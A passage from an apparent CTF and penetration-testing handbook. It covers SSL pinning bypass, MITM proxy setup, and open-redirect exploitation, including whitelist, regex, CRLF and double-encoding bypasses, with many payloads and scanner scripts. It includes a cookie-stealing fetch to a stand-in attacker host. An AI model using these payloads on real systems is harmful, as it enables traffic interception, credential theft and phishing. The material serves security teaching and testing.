    </base-config>
</network-security-config>
EOF

# Rebuild and sign
apktool b application/ -o modified.apk
keytool -genkey -v -keystore release.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore release.keystore modified.apk alias_name
zipalign -v 4 modified.apk aligned.apk
```

### Bypass Methods - iOS

**SSL Kill Switch 2** (jailbroken devices):

```bash
# Add Cydia repository
# Install SSL Kill Switch 2 package
# Toggle in Settings → SSL Kill Switch
```

**Frida bypass**:

```javascript
// iOS SSL pinning bypass
if (ObjC.available) {
    var NSURLSession = ObjC.classes.NSURLSession;
    var originalDelegate = NSURLSession['- URLSession:didReceiveChallenge:completionHandler:'];
    
    Interceptor.attach(originalDelegate.implementation, {
        onEnter: function(args) {
            console.log('[+] NSURLSession challenge intercepted');
            var completionHandler = new ObjC.Block(args[4]);
            completionHandler.implementation = function(disposition, credential) {
                console.log('[+] Accepting all certificates');
                return 0; // NSURLSessionAuthChallengeUseCredential
            };
        }
    });

    // AFNetworking bypass
    var AFSecurityPolicy = ObjC.classes.AFSecurityPolicy;
    if (AFSecurityPolicy) {
        Interceptor.attach(AFSecurityPolicy['- setSSLPinningMode:'].implementation, {
            onEnter: function(args) {
                console.log('[+] AFNetworking pinning disabled');
                args[2] = 0; // AFSSLPinningModeNone
            }
        });
    }
}
```

**Objection for iOS**:

```bash
objection -g "Application Name" explore
ios sslpinning disable
```

### Desktop Application Bypass

**Burp Suite configuration**:

```bash
# Export Burp CA certificate
# Proxy → Options → Import / Export CA certificate

# Install in system trust store (Linux)
sudo cp burp-ca.crt /usr/local/share/ca-certificates/
sudo update-ca-certificates

# Windows
certutil -addstore -f "ROOT" burp-ca.crt

# macOS
sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain burp-ca.crt
```

**Python application bypass**:

```python
# Disable SSL verification
import requests
requests.get('https://target.com', verify=False)

# Or set REQUESTS_CA_BUNDLE
export REQUESTS_CA_BUNDLE=/path/to/burp-ca.pem
```

**Node.js application**:

```bash
# Disable certificate validation
NODE_TLS_REJECT_UNAUTHORIZED=0 node application.js
```

**Java application**:

```bash
# Import Burp cert to Java keystore
keytool -import -alias burp -keystore $JAVA_HOME/jre/lib/security/cacerts -file burp-ca.der

# Or disable validation
java -Djavax.net.ssl.trustStore=/path/to/truststore -jar application.jar
```

### Binary Patching

**Identify pinning code**:

```bash
# Search for SSL/TLS functions
strings binary | grep -i "ssl\|tls\|certificate"

# Disassemble with radare2
r2 -A binary
aaa
afl | grep -i ssl
```

**Patch validation function**:

```bash
# Example: NOP out certificate check
r2 -w binary
s sym.certificate_verify
pd 20  # Disassemble 20 instructions

# Replace validation with NOP or return success
wa "mov eax, 1; ret" @ sym.certificate_verify
```

[Inference]: Binary patching approach depends on architecture and calling convention; x86_64 example shown.

## Self-Signed Certificate Exploitation

### Context and Purpose

Self-signed certificates lack third-party CA validation, creating trust issues but also opportunities for testing and exploitation in controlled environments.

### Generation

**OpenSSL command**:

```bash
# Generate private key
openssl genrsa -out server.key 2048

# Create certificate signing request
openssl req -new -key server.key -out server.csr -subj "/C=US/ST=State/L=City/O=Org/CN=target.com"

# Self-sign certificate
openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt

# Combined command
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=target.com"
```

**With Subject Alternative Names (SANs)**:

```bash
# Create config file
cat > san.cnf << EOF
[req]
distinguished_name = req_distinguished_name
req_extensions = v3_req
prompt = no

[req_distinguished_name]
CN = target.com

[v3_req]
keyUsage = keyEncipherment, dataEncipherment
extendedKeyUsage = serverAuth
subjectAltName = @alt_names

[alt_names]
DNS.1 = target.com
DNS.2 = *.target.com
DNS.3 = localhost
IP.1 = 10.10.10.100
EOF

openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -config san.cnf -extensions v3_req
```

### MITM Attack Setup

**Using mitmproxy**:

```bash
# Start mitmproxy
mitmproxy -p 8080 --ssl-insecure

# Or with transparent mode
mitmproxy --mode transparent --showhost -p 8080
```

**Using Burp Suite**:

```
1. Proxy → Options → Proxy Listeners → Add
2. Bind to port: 8080
3. Support invisible proxying: Enable
4. Generate CA certificate: Export and install on target
```

**Using sslsplit**:

```bash
# Install sslsplit
apt install sslsplit

# Generate CA
mkdir -p /tmp/sslsplit
openssl req -x509 -new -nodes -newkey rsa:2048 -keyout /tmp/sslsplit/ca.key -out /tmp/sslsplit/ca.crt -days 365 -subj "/CN=FakeCA"

# Run sslsplit
sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k /tmp/sslsplit/ca.key -c /tmp/sslsplit/ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080
```

**Network redirection** (iptables):

```bash
# Redirect HTTPS traffic to proxy
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### Trust Exploitation Scenarios

**Attacking client applications**:

Applications that don't validate certificates properly accept self-signed certs:

```python
# Vulnerable Python code
import requests
requests.get('https://target.com', verify=False)  # Disables validation

# Exploit: MITM with any certificate succeeds
```

**Testing procedure**:

```bash
# Start local HTTPS server with self-signed cert
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes -subj "/CN=localhost"
python3 -c "import http.server, ssl; 
server_address = ('0.0.0.0', 4443); 
httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler); 
httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='cert.pem', keyfile='key.pem', ssl_version=ssl.PROTOCOL_TLS); 
httpd.serve_forever()"

# Test if application accepts connection
curl -k https://localhost:4443
```

### CTF Exploitation Patterns

**Scenario 1: Extracting credentials from applications**

```bash
# Setup proxy with self-signed cert
mitmproxy -p 8080

# Configure application to use proxy
export HTTP_PROXY=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080

# If app doesn't validate, credentials captured in mitmproxy
```

**Scenario 2: Certificate information disclosure**

```bash
# Extract certificate details
openssl s_client -connect target.com:443 -showcerts 2>/dev/null | openssl x509 -noout -text

# Check for information in extensions
openssl x509 -in cert.pem -noout -text | grep -A 5 "Subject Alternative Name"
```

Look for:

- Internal hostnames in CN/SAN fields
- Email addresses in certificate fields
- Organization details revealing infrastructure
- Weak key sizes (< 2048 bits)

**Scenario 3: Downgrade attacks**

If server accepts both valid and self-signed certs, force self-signed usage:

```bash
# Test server cipher preference
nmap --script ssl-enum-ciphers -p 443 target.com

# Attempt connection with weak ciphers only
openssl s_client -connect target.com:443 -cipher 'EXPORT'
```

### Certificate Analysis Tools

**crt.sh query**:

```bash
# Search certificate transparency logs
curl "https://crt.sh/?q=target.com&output=json" | jq .
```

**sslscan comprehensive analysis**:

```bash
sslscan --show-certificate target.com
```

**testssl.sh detailed check**:

```bash
./testssl.sh --full target.com
```

**Manual certificate download**:

```bash
# Extract certificate chain
echo | openssl s_client -connect target.com:443 -showcerts 2>/dev/null | sed -n '/BEGIN CERTIFICATE/,/END CERTIFICATE/p' > cert_chain.pem

# Split into individual certificates
csplit -f cert- cert_chain.pem '/-----BEGIN CERTIFICATE-----/' '{*}'

# Analyze each
for cert in cert-*; do
    openssl x509 -in "$cert" -noout -subject -issuer -dates
done
```

### Validation Bypass Detection

**Client-side indicators**:

- Connection succeeds with obviously invalid certificate
- No certificate warnings in application
- Accepts expired certificates without error

**Testing methodology**:

```bash
# Create expired certificate
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out expired.pem -days -1 -nodes -subj "/CN=target.com"

# Create wrong CN certificate  
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out wrong.pem -days 365 -nodes -subj "/CN=wrong.com"

# Test application with each certificate
```

If application accepts any certificate, validation is bypassed or disabled.

---

**Related exploitation areas**: Man-in-the-Middle attacks, network traffic analysis, cryptographic weaknesses, authentication bypass, API security testing

---

# Open Redirect

## Parameter-Based Redirects

### Overview

Parameter-based open redirects occur when applications accept user-controlled input to determine redirect destinations without proper validation. Attackers exploit these to redirect users to malicious sites, often for phishing or stealing credentials.

### Common Vulnerable Patterns

**URL parameters:**

```
http://target.com/redirect?url=https://evil.com
http://target.com/goto?target=https://malicious.site
http://target.com/login?next=/dashboard
http://target.com/auth?redirect_uri=https://attacker.com
http://target.com/link?dest=evil.com
```

**Common parameter names:**

```
url, redirect, redirect_uri, redirect_url, return, return_url, returnTo
next, next_page, goto, target, destination, dest, continue, view
rurl, out, checkout_url, return_path, success_url, callback
link, forward, forwarding, go, navigate, page
```

### Detection Techniques

**Manual testing workflow:**

```bash
# Step 1: Identify redirect parameters in requests
# Look for 3xx status codes or meta refresh tags

# Step 2: Test with external domain
curl -i "http://target.com/redirect?url=https://evil.com"

# Step 3: Check response
# - Location header points to evil.com
# - Meta refresh: <meta http-equiv="refresh" content="0;url=https://evil.com">
# - JavaScript: window.location = "https://evil.com"
```

**Common response patterns:**

```http
HTTP/1.1 302 Found
Location: https://evil.com

HTTP/1.1 301 Moved Permanently  
Location: https://attacker.com

HTTP/1.1 200 OK
<meta http-equiv="refresh" content="0; url=https://evil.com">

HTTP/1.1 200 OK
<script>window.location.href="https://evil.com";</script>
```

### Exploitation Techniques

**Basic exploitation:**

```bash
# Direct external redirect
http://target.com/redirect?url=https://evil.com

# Protocol manipulation
http://target.com/redirect?url=javascript:alert(document.cookie)
http://target.com/redirect?url=data:text/html,<script>alert(1)</script>

# Path-based
http://target.com/redirect?path=/../../evil.com
```

**Relative path abuse:**

```bash
# If application expects relative paths
http://target.com/redirect?next=/dashboard
# Becomes: http://target.com/dashboard

# Bypass with protocol-relative URL
http://target.com/redirect?next=//evil.com
# Becomes: http://evil.com (inherits protocol)

# Alternative notations
http://target.com/redirect?next=///evil.com
http://target.com/redirect?next=\\/\\/evil.com
http://target.com/redirect?next=%2F%2Fevil.com
```

**OAuth/SAML redirect exploitation:**

```bash
# OAuth redirect_uri parameter
https://target.com/oauth/authorize?redirect_uri=https://evil.com&client_id=123

# SAML RelayState parameter  
https://target.com/saml/sso?RelayState=https://evil.com

# Open redirect in OAuth flow enables token theft:
# 1. Attacker crafts malicious authorization URL
# 2. Victim authenticates
# 3. Authorization code sent to attacker's domain
```

**Chaining with other vulnerabilities:**

```bash
# Open redirect + XSS
http://target.com/redirect?url=javascript:fetch('//attacker.com?c='+document.cookie)

# Open redirect for header injection [Unverified - depends on implementation]
http://target.com/redirect?url=https://evil.com%0d%0aSet-Cookie:session=malicious
```

### Automated Scanning

**Using ffuf for parameter discovery:**

```bash
# Fuzz for redirect parameters
ffuf -u "http://target.com/redirect?FUZZ=https://evil.com" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -mc 301,302,303,307,308 \
     -fw 0

# Fuzz multiple positions
ffuf -u "http://target.com/FUZZ?redirect=https://evil.com" \
     -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
     -mc 301,302,303,307,308
```

**Using OpenRedireX:**

```bash
git clone https://github.com/devanshbatham/OpenRedireX.git
cd OpenRedireX
pip3 install -r requirements.txt

# Scan single URL
python3 openredirex.py -u "http://target.com/redirect?url=FUZZ" -p payloads.txt

# Scan from list
python3 openredirex.py -l urls.txt -p payloads.txt --keyword FUZZ
```

**Using Burp Suite Intruder:**

```
1. Identify redirect parameter in proxy history
2. Send to Intruder (Ctrl+I)
3. Set payload position: ?url=§§
4. Load payload list:
   - https://evil.com
   - //evil.com
   - ///evil.com
   - ////evil.com
   - https:evil.com
   - /\evil.com
5. Grep - Match: Location:|refresh|window.location
6. Start attack, analyze responses
```

**Custom script for batch testing:**

```python
#!/usr/bin/env python3
import requests
import sys
from urllib.parse import urljoin, urlparse

def test_open_redirect(base_url, param_name):
    """Test URL for open redirect vulnerability"""
    
    test_payloads = [
        "https://evil.com",
        "//evil.com",
        "///evil.com",
        "////evil.com",
        "https:evil.com",
        "/\\evil.com",
        "/\\/\\/evil.com",
        "https://evil.com%00",
        "https://evil.com%0a",
        "https://evil.com%0d",
        "@evil.com",
        "?@evil.com",
        "#@evil.com",
    ]
    
    for payload in test_payloads:
        url = f"{base_url}?{param_name}={payload}"
        
        try:
            # Don't follow redirects
            response = requests.get(url, allow_redirects=False, timeout=5)
            
            # Check Location header
            if 'Location' in response.headers:
                location = response.headers['Location']
                if 'evil.com' in location:
                    print(f"[+] VULNERABLE: {url}")
                    print(f"    Redirects to: {location}")
                    return True
            
            # Check HTML content for meta refresh or JavaScript redirect
            if response.status_code == 200:
                content = response.text.lower()
                if ('evil.com' in content and 
                    ('window.location' in content or 'meta' in content)):
                    print(f"[+] POTENTIAL: {url}")
                    print(f"    Check response manually")
                    
        except Exception as e:
            print(f"[-] Error testing {url}: {e}")
    
    return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <url> <parameter>")
        sys.exit(1)
    
    test_open_redirect(sys.argv[1], sys.argv[2])
```

### Practical CTF Scenarios

**Scenario 1: Login flow redirect**

```bash
# Application redirects after login
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=pass&next=/dashboard

# Test external redirect
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=pass&next=https://evil.com
```

**Scenario 2: Link shortener/tracking**

```bash
# Application tracks outbound clicks
http://target.com/track?id=12345&url=https://legitimate.com

# Test redirect
http://target.com/track?id=12345&url=https://evil.com
```

**Scenario 3: File download redirects**

```bash
# Download endpoint with redirect
http://target.com/download?file=report.pdf&redirect=/thanks

# Exploit
http://target.com/download?file=report.pdf&redirect=https://evil.com
```

---

## Whitelist Bypass

### Overview

Applications often implement whitelists to restrict redirect destinations to trusted domains. Bypasses exploit parsing differences, validation flaws, and edge cases in URL handling.

### Domain Validation Bypasses

**Subdomain confusion:**

```bash
# Application whitelist: target.com
# Bypass with attacker-controlled subdomain

# If validation checks "contains target.com"
https://target.com.evil.com

# If validation checks "ends with target.com"  
https://evil-target.com
https://fake.target.com.evil.com
```

**Using @ symbol (username in URL):**

```bash
# Browser interprets content before @ as credentials
# Content after @ is the actual host

http://target.com@evil.com
https://target.com@evil.com/
https://trusted.com:80@attacker.com

# URL structure: protocol://username:password@host:port/path
# Many parsers focus on presence of trusted domain, miss @ separator
```

**Using URL fragments and query strings:**

```bash
# Fragment identifier (#) often ignored by validators
http://evil.com#target.com
http://evil.com?target.com

# Parser may extract "target.com" without checking full URL
http://evil.com/path?legitimate=target.com
http://evil.com/target.com
```

**Decimal/Octal/Hex IP encoding:**

```bash
# If whitelist checks domain name, use IP encoding

# Decimal: 127.0.0.1 = 2130706433
http://2130706433/

# Octal: 127.0.0.1 = 0177.0.0.1
http://0177.0.0.1/

# Hex: 127.0.0.1 = 0x7f.0x0.0x0.0x1
http://0x7f000001/

# Mixed encoding
http://0x7f.0.0.1/
```

**IPv6 bypass:**

```bash
# If whitelist only checks IPv4
http://[::1]/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# IPv6 with embedded IPv4
http://[::ffff:ac10:0001]/  # 172.16.0.1
```

**Using alternative domain representations:**

```bash
# Internationalized Domain Names (IDN)
# Homograph attack: visually similar characters
http://tаrget.com  # Cyrillic 'а' instead of 'a'
http://tarġet.com  # Unicode lookalikes

# Punycode encoding
http://xn--trget-kua.com  # Encodes special characters
```

**Path traversal in redirect:**

```bash
# If validation only checks domain
http://target.com/../../../evil.com
http://target.com/..;/..;/evil.com
http://target.com/%2e%2e%2f%2e%2e%2fevil.com

# Some parsers normalize path before redirect
```

**Protocol smuggling:**

```bash
# Missing protocol validation
javascript:alert(1)//target.com
data:text/html,<script>alert(1)</script>//target.com
vbscript:msgbox(1)//target.com

# Null byte injection [Unverified in modern systems]
http://target.com%00.evil.com
http://target.com\x00@evil.com
```

**CRLF injection in redirect:**

```bash
# Inject carriage return and line feed to break headers
http://target.com/%0d%0aLocation:%20https://evil.com

# Full example
http://target.com/redirect?url=https://target.com%0d%0aLocation:%20https://evil.com%0d%0a

# Resulting response may have:
Location: https://target.com
Location: https://evil.com
```

### Parser Differential Attacks

**Browser vs Server parsing differences:**

```python
#!/usr/bin/env python3
from urllib.parse import urlparse
import requests

# Test how different parsers handle same URL
test_urls = [
    "http://target.com@evil.com",
    "http://target.com:80@evil.com",
    "http://target.com#@evil.com",
    "http://evil.com#target.com",
    "http://target.com\\@evil.com",
]

for url in test_urls:
    # Python's parser
    parsed = urlparse(url)
    print(f"\nURL: {url}")
    print(f"  netloc: {parsed.netloc}")
    print(f"  hostname: {parsed.hostname}")
    
    # Test actual redirect
    try:
        resp = requests.get(f"http://target.com/redirect?url={url}", 
                          allow_redirects=False, timeout=5)
        print(f"  Server redirects to: {resp.headers.get('Location', 'N/A')}")
    except:
        pass
```

**Language-specific parsing quirks:**

```javascript
// JavaScript URL parser
const url = new URL("http://target.com@evil.com");
console.log(url.hostname);  // "evil.com"
console.log(url.username);  // "target.com"

// But string matching might see:
if (redirectUrl.includes("target.com")) {
    // Matches! False sense of security
}
```

```php
<?php
// PHP parse_url() behavior
$url = "http://target.com@evil.com";
$parsed = parse_url($url);
echo $parsed['host'];  // "evil.com"
echo $parsed['user'];  // "target.com"

// Vulnerable validation:
if (strpos($url, 'target.com') !== false) {
    header("Location: " . $url);  // Redirects to evil.com
}
?>
```

### Regex Bypass Techniques

**Common vulnerable regex patterns:**

```python
#!/usr/bin/env python3
import re

# Vulnerable pattern 1: Unanchored regex
pattern1 = re.compile(r"target\.com")
# Matches: http://evil.com?target.com
# Matches: http://target.com.evil.com

# Vulnerable pattern 2: Missing ^ anchor
pattern2 = re.compile(r"https://target\.com")
# Matches: http://evil.com#https://target.com

# Vulnerable pattern 3: Case sensitivity
pattern3 = re.compile(r"^https://target\.com")
# Doesn't match: HTTPS://TARGET.COM
# Doesn't match: HtTpS://target.com

# Vulnerable pattern 4: Incomplete domain check
pattern4 = re.compile(r"^https://(.*\.)?target\.com")
# Matches: https://evil-target.com (if . not escaped properly)
```

**Crafting bypass payloads:**

```bash
# Against: ^https://target\.com
https://target.com@evil.com
https://target.com.evil.com

# Against: target\.com$
http://evil.com/target.com
http://evil.com?target.com

# Against: ^https://(www\.)?target\.com
https://ww.target.com  # If capturing group not enforced
https://wwww.target.com

# Against: https://(.*\.)?target\.com
https://target.com%00.evil.com  # Null byte
https://target.com#.evil.com
https://target.com\.evil.com  # Escaped backslash
```

**Testing regex with ReDoS potential:**

```python
#!/usr/bin/env python3
import re
import time

# Potentially vulnerable regex (catastrophic backtracking)
pattern = re.compile(r"^https://(.*\.)*target\.com$")

payloads = [
    "https://" + "a." * 30 + "target.com",  # Valid, but slow
    "https://" + "a." * 30 + "target.co",   # Invalid, very slow
]

for payload in payloads:
    start = time.time()
    result = pattern.match(payload)
    elapsed = time.time() - start
    print(f"Payload: {payload[:50]}...")
    print(f"  Match: {result is not None}, Time: {elapsed:.4f}s\n")
```

### Whitelist Implementation Flaws

**Incomplete protocol validation:**

```bash
# Whitelist allows: https://target.com
# But doesn't validate protocol

javascript://target.com/%0aalert(1)
data://target.com,<script>alert(1)</script>
vbscript://target.com/%0amsgbox(1)
```

**Path-based whitelist bypass:**

```bash
# Whitelist: /allowed-path/*
# Application checks if redirect starts with "/allowed-path/"

# Bypass with double slash
//evil.com/allowed-path/

# Bypass with backslash (Windows)
\/\/evil.com/allowed-path/

# Bypass with encoded slash
/%2f/evil.com/allowed-path/
```

**Parameter pollution:**

```bash
# Application takes first parameter for validation, second for redirect
http://target.com/redirect?url=https://target.com&url=https://evil.com

# Or last parameter
http://target.com/redirect?url=https://evil.com&url=https://target.com

# Test with Burp Repeater: duplicate parameters, observe which is used
```

**Flash/Java parameter pollution:**

```bash
# Flash interprets semicolon as parameter separator
http://target.com/redirect?url=https://target.com;url=https://evil.com

# Java HttpServletRequest.getParameter() returns first
# But some frameworks return last
```

### Advanced Bypass Techniques

**Unicode normalization bypass:**

```python
#!/usr/bin/env python3
import unicodedata

# Different Unicode representations of same character
original = "target.com"
variations = [
    "target\u2024com",    # One dot leader
    "target\uff0ecom",    # Fullwidth full stop
    "target\u3002com",    # Ideographic full stop
    "t\u0041rget.com",    # Latin capital letter A (looks like 'a')
]

for var in variations:
    normalized = unicodedata.normalize('NFKC', var)
    print(f"{repr(var)} -> {repr(normalized)}")
```

**DNS rebinding for whitelist bypass:**

[Inference] DNS rebinding involves an attacker-controlled DNS server that returns different IP addresses for the same domain on successive lookups, potentially bypassing time-of-check-time-of-use validations.

```bash
# Setup requires:
# 1. Domain with very low TTL (e.g., 0 seconds)
# 2. DNS server returning legitimate IP during validation
# 3. DNS server returning attacker IP during actual redirect

# Example: rebind.network provides this as a service
http://target.com/redirect?url=http://A.B.C.D.1time.rebind.network

# First resolution: returns A.B.C.D (legitimate)
# Second resolution: returns attacker-controlled IP
```

**Using URL shorteners:**

```bash
# If application validates full URL but follows redirects
# Create chain: bit.ly -> evil.com

# Submit to application:
http://target.com/redirect?url=https://bit.ly/abc123

# bit.ly redirects to attacker site
```

### Bypass Testing Methodology

```bash
#!/bin/bash
# Automated whitelist bypass testing script

TARGET="http://target.com/redirect"
PARAM="url"
EVIL="https://evil.com"

# Test basic bypass techniques
curl -i "${TARGET}?${PARAM}=${EVIL}"
curl -i "${TARGET}?${PARAM}=//${EVIL}"
curl -i "${TARGET}?${PARAM}=///${EVIL}"
curl -i "${TARGET}?${PARAM}=${EVIL}%00"
curl -i "${TARGET}?${PARAM}=${EVIL}%0a"
curl -i "${TARGET}?${PARAM}=${EVIL}%0d"

# Test @ symbol variations
curl -i "${TARGET}?${PARAM}=http://target.com@${EVIL}"
curl -i "${TARGET}?${PARAM}=http://target.com:80@${EVIL}"

# Test subdomain confusion
curl -i "${TARGET}?${PARAM}=https://target.com.${EVIL}"
curl -i "${TARGET}?${PARAM}=https://${EVIL}/target.com"
curl -i "${TARGET}?${PARAM}=https://${EVIL}?target.com"
curl -i "${TARGET}?${PARAM}=https://${EVIL}#target.com"

# Test backslash variations
curl -i "${TARGET}?${PARAM}=https://target.com\\@${EVIL}"
curl -i "${TARGET}?${PARAM}=https:\\/\\/${EVIL}"

# Test parameter pollution
curl -i "${TARGET}?${PARAM}=https://target.com&${PARAM}=${EVIL}"
```

---

## Double Encoding

### Overview

Double encoding (or multiple encoding) involves encoding special characters multiple times. Applications that decode input multiple times or inconsistently can be bypassed using this technique.

### Encoding Fundamentals

**Single vs. double encoding:**

```bash
# Original: https://evil.com
# Single URL encode: https%3A%2F%2Fevil.com
# Double URL encode: https%253A%252F%252Fevil.com

# Forward slash (/)
# Single: %2F
# Double: %252F

# Colon (:)  
# Single: %3A
# Double: %253A

# At symbol (@)
# Single: %40
# Double: %2540
```

**Why double encoding works:**

```
1. First decoding pass (WAF/filter): %252F -> %2F (still encoded)
2. Validation sees: https:%2F%2Fevil.com (looks malformed, might pass)
3. Second decoding pass (application): %2F -> / (actual redirect)
4. Application redirects to: https://evil.com
```

### Exploitation Techniques

**Basic double encoding bypass:**

```bash
# Normal redirect (blocked)
http://target.com/redirect?url=https://evil.com

# Single encoded (blocked)
http://target.com/redirect?url=https%3A%2F%2Fevil.com

# Double encoded (may bypass)
http://target.com/redirect?url=https%253A%252F%252Fevil.com

# Triple encoded (for multiple decode layers)
http://target.com/redirect?url=https%25253A%25252F%25252Fevil.com
```

**Mixed encoding bypass:**

```bash
# Combine encoded and non-encoded characters
http://target.com/redirect?url=https%3A//evil.com
http://target.com/redirect?url=https:%2F%2Fevil.com
http://target.com/redirect?url=https%253A//evil.com

# Encode only suspicious parts
http://target.com/redirect?url=//%2565vil.com  # 'e' encoded
http://target.com/redirect?url=//e%2576il.com  # 'v' encoded
```

**Protocol encoding:**

```bash
# Double encode protocol separator
http://target.com/redirect?url=javascript%253Aalert(1)
# After first decode: javascript%3Aalert(1)
# After second decode: javascript:alert(1)

# Data URI double encoding
http://target.com/redirect?url=data%253Atext%252Fhtml%252C<script>alert(1)</script>
# Decodes to: data:text/html,<script>alert(1)</script>
```

**Path traversal with double encoding:**

```bash
# Single encoding blocked
http://target.com/redirect?url=%2F%2Fevil.com

# Double encoding
http://target.com/redirect?url=%252F%252Fevil.com

# Combined with path traversal
http://target.com/redirect?url=/%252e%252e%252f%252e%252e%252fevil.com
# Decodes through: /%2e%2e%2f%2e%2e%2fevil.com -> /../../../evil.com
```

**Null byte double encoding:**

```bash
# Double encoded null byte
http://target.com/redirect?url=https://target.com%2500.evil.com
# First decode: https://target.com%00.evil.com
# Second decode: https://target.com\x00.evil.com

# Some parsers stop at null byte, reading only "https://target.com"
```

**CRLF injection with double encoding:**

```bash
# Double encoded CRLF for header injection
http://target.com/redirect?url=https://target.com%250d%250aLocation:%2520https://evil.com

# First decode: https://target.com%0d%0aLocation:%20https://evil.com
# Second decode: https://target.com\r\nLocation: https://evil.com
```

### Testing Methodology

**Manual testing sequence:**

```python
#!/usr/bin/env python3
import urllib.parse
import requests

def test_encoding_levels(base_url, param, payload):
    """Test single, double, triple encoding"""
    
    encodings = {
        'plain': payload,
        'single': urllib.parse.quote(payload, safe=''),
        'double': urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe=''),
        'triple': urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe=''), safe=''),
    }
    
    for level, encoded in encodings.items():
        url = f"{base_url}?{param}={encoded}"
        print(f"\n[*] Testing {level} encoding:")
        print(f"    URL: {url}")
        
        try:
            resp = requests.get(url, allow_redirects=False, timeout=5)
            print(f"    Status: {resp.status_code}")
            
            if 'Location' in resp.headers:
                print(f"    Redirects to: {resp.headers['Location']}")
                if 'evil.com' in resp.headers['Location']:
                    print(f"    [+] VULNERABLE with {level} encoding!")
        except Exception as e:
            print(f"    Error: {e}")

# Usage
test_encoding_levels(
    "http://target.com/redirect",
    "url", 
    "https://evil.com"
)
```

**Automated fuzzing with encoding:**

```bash
# Using wfuzz with double encoding
wfuzz -c -z file,payloads.txt \
      --filter "c=301 or c=302" \
      --hh 0 \
      "http://target.com/redirect?url=FUZZ"

# Create payload list with encodings
cat > encoded_payloads.txt << EOF
https://evil.com
https%3A%2F%2Fevil.com
https%253A%252F%252Fevil.com
//evil.com
%2F%2Fevil.com
%252F%252Fevil.com
EOF

# Test with curl in loop
while IFS= read -r payload; do
    echo "Testing: $payload"
    curl -i "http://target.com/redirect?url=$payload" 2>&1 | grep -i "location:"
done < encoded_payloads.txt
```

**Burp Intruder with encoding:**

```
1. Send request to Intruder
2. Set payload position: ?url=§§
3. Payload Processing Rules:
   - Add: URL-encode all characters
   - Add: URL-encode all characters (applied twice for double encoding)
4. Payloads:
   https://evil.com
   //evil.com
   @evil.com
5. Grep - Match: Location:|evil.com
```

### Character Encoding Variations

**Mixed character encoding:**

```bash
# UTF-8 + URL encoding
http://target.com/redirect?url=%C0%AF%C0%AF%65%76%69%6C%2E%63%6F%6D
# Overlong UTF-8 encoding of // (may bypass filters)

# Unicode escapes in URL
http://target.com/redirect?url=\u0068\u0074\u0074\u0070\u0073://evil.com

# HTML entity encoding (if processed)
http://target.com/redirect?url=https&#58;//evil&#46;com
```

**Encoding specific characters strategically:**

```python
#!/usr/bin/env python3
import urllib.parse

def selective_encode(url, chars_to_encode):
    """Encode only specific characters"""
    result = []
    for char in url:
        if char in chars_to_encode:
            result.append(urllib.parse.quote(char))
        else:
            result.append(char)
    return ''.join(result)

# Example: encode only slashes
payload = selective_encode("https://evil.com", "/")
print(payload)  # https:%2F%2Fevil.com

# Double encode only slashes
double = selective_encode(payload, "/")
print(double)  # https:%252F%252Fevil.com
```

### Framework-Specific Behaviors

**PHP double decoding:**

```php
<?php
// PHP automatically decodes once
$url = $_GET['url'];  // https%3A%2F%2Fevil.com -> https://evil.com

// If application decodes again
$decoded = urldecode($url);  // Double decoding vulnerability

// Test with: url=https%253A%252F%252Fevil.com
// First decode (automatic): https%3A%2F%2Fevil.com
// Second decode (manual): https://evil.com
?>
```

**Python Flask/Django:**

```python
# Flask automatically decodes URL parameters
from flask import request

@app.route('/redirect')
def redirect_page():
    # request.args.get() returns decoded value
    url = request.args.get('url')  # Already decoded once
    
    # If application decodes again (vulnerable)
    from urllib.parse import unquote
    decoded = unquote(url)  # Double decode
    
    return redirect(decoded)
```

**ASP.NET:**

```csharp
// ASP.NET Request.QueryString decodes automatically
string url = Request.QueryString["url"];  // Decoded once

// Manual decode creates vulnerability
string decoded = Server.UrlDecode(url);  // Double decode

Response.Redirect(decoded);
```

### Detection and Exploitation Tools

**Custom double encoding tester:**

```python
#!/usr/bin/env python3
import requests
import urllib.parse
from itertools import product

def generate_encoding_variants(payload):
    """Generate all encoding combinations"""
    variants = []
    
    # Single encode entire payload
    single = urllib.parse.quote(payload, safe='')
    variants.append(('single_full', single))
    
    # Double encode entire payload
    double = urllib.parse.quote(single, safe='')
    variants.append(('double_full', double))
    
    # Mixed: encode protocol separator only
    mixed1 = payload.replace(':', '%3A')
    variants.append(('mixed_colon', mixed1))
    
    mixed2 = payload.replace(':', '%253A')
    variants.append(('mixed_colon_double', mixed2))
    
    # Mixed: encode slashes only
    mixed3 = payload.replace('/', '%2F')
    variants.append(('mixed_slash', mixed3))
    
    mixed4 = payload.replace('/', '%252F')
    variants.append(('mixed_slash_double', mixed4))
    
    # Selective character encoding
    chars_to_test = [':', '/', '.', '@']
    for encode_these in [combo for i in range(1, len(chars_to_test)+1) for combo in product([True, False], repeat=len(chars_to_test))]: 
	    variant = payload 
	    for i, char in enumerate(chars_to_test): 
